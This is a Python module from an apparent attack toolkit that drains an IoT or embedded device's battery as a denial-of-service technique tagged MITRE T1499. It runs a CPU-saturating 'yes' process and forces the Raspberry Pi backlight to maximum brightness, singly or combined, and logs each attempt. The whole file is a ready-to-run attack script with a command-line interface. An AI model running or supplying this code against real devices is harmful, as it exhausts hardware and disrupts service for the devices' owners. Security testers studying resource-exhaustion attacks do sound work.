# modules/attacks/battery_overdrain_exploit.py

import os
import json
import time
import argparse
import subprocess
from datetime import datetime

LOG_PATH = "results/battery_drain_log.json"
MITRE_TTP = "T1499"

def log_drain(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def stress_cpu(duration=30):
    try:
        subprocess.Popen(["yes"], stdout=subprocess.DEVNULL)
        time.sleep(duration)
        subprocess.run(["pkill", "yes"])
        return True
    except:
        return False

def max_brightness():
    try:
        with open("/sys/class/backlight/rpi_backlight/brightness", "w") as f:
            f.write("255")
        return True
    except:
        return False

def execute(method, duration):
    ts = datetime.utcnow().isoformat()
    if method == "cpu":
        success = stress_cpu(duration)
    elif method == "brightness":
        success = max_brightness()
    elif method == "combo":
        stress_cpu(duration)
        max_brightness()
        success = True
    else:
        success = False

    log_drain({
        "timestamp": ts,
        "method": method,
        "duration": duration,
        "success": success,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Drain IoT or embedded battery using stress techniques")
    parser.add_argument("--method", choices=["cpu", "brightness", "combo"], required=True, help="Attack method")
    parser.add_argument("--duration", type=int, default=30, help="Duration of drain attack")
    args = parser.parse_args()
    execute(args.method, args.duration)
